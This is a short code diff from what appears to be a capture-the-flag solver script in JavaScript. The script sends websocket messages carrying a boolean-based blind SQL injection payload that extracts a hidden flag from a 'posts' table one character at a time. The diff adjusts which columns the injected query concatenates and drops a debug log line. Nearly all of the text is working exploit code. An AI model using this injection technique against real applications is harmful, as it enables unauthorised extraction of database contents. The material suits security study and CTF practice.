@@ -162,7 +162,7 @@
             socket.send(
                 msgpack.encode([
                     "getPost",
-                    `1 and ((select hex(group_concat(author,hidden,id,postDate,text,title)) from posts) like '%${flag + charset[i]}%')`
+                    `1 and ((select hex(group_concat(title) || group_concat(text)) from posts) like '%${flag + charset[i]}%')`
                 ])
             );
             logMessage("flag", `Enumerating Flag ${flag}`);
@@ -172,7 +172,6 @@
     const enumFlag = (success = false, firstCall = false) => {
         firstCall && sendFlagPayload();
         if (success) {
-            console.log(success);
             flag = /\) like '%(.*)%'/.exec(success)[1];
             if (aesjs.utils.utf8.fromBytes(buffer.from(flag, "hex")).substr(-1) === "}") {
                 callback = () => {};
